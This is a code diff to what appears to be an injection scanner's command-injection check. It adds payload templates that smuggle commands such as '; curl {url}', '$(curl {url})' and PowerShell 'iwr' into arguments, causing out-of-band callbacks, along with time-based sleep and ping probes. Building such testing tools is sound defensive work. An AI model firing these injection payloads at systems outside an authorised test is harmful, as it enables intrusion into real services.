@@ -4,20 +4,39 @@ from mcprobe.checks.base import register
 _SLEEP_SECONDS = 5
 _LATENCY_MULT = 3
 
+# OOB confirmation payloads: each triggers an outbound request to {url}. Covers POSIX
+# sh, Windows cmd.exe, and PowerShell, deduped. Non-blocking (always sent).
+_OOB_TEMPLATES = (
+    "; curl {url}",          # POSIX
+    "$(curl {url})",         # POSIX command substitution
+    "& curl {url}",          # cmd.exe / POSIX background
+    "| curl {url}",          # cmd.exe / POSIX pipe
+    "; iwr {url}",           # PowerShell (Invoke-WebRequest)
+    "; curl.exe {url}",      # PowerShell (real curl, not the iwr alias)
+)
+
+# Blocking time-based payloads (~_SLEEP_SECONDS delay), sent only with --aggressive.
+_SLEEP_TEMPLATES = (
+    "; sleep {n}",                # POSIX
+    "$(sleep {n})",               # POSIX command substitution
+    "& ping -n {n1} 127.0.0.1",   # cmd.exe (no sleep builtin; ping ~1s/echo)
+    "; Start-Sleep -s {n}",       # PowerShell
+)
+
 @register
 class CmdInjection:
     id = "cmd_injection"
     def generate(self, point, ctx):
         probes = []
         if ctx.oob is not None:
-            for tpl in ("; curl {url}", "$(curl {url})", "& curl {url}"):
+            for tpl in _OOB_TEMPLATES:
                 token, url = ctx.oob.new_token()
                 pl = f"mcprobe{tpl.format(url=url)}"
                 probes.append(Probe(check=self.id, point=point, payload=pl,
                                     args=point.set(pl), token=token))
         if getattr(ctx, "aggressive", False):
-            for tpl in (f"; sleep {_SLEEP_SECONDS}", f"$(sleep {_SLEEP_SECONDS})"):
-                pl = f"mcprobe{tpl}"
+            for tpl in _SLEEP_TEMPLATES:
+                pl = f"mcprobe{tpl.format(n=_SLEEP_SECONDS, n1=_SLEEP_SECONDS + 1)}"
                 probes.append(Probe(check=self.id, point=point, payload=pl, args=point.set(pl),
                                     meta={"time_based": True, "threshold": _SLEEP_SECONDS}))
         return probes
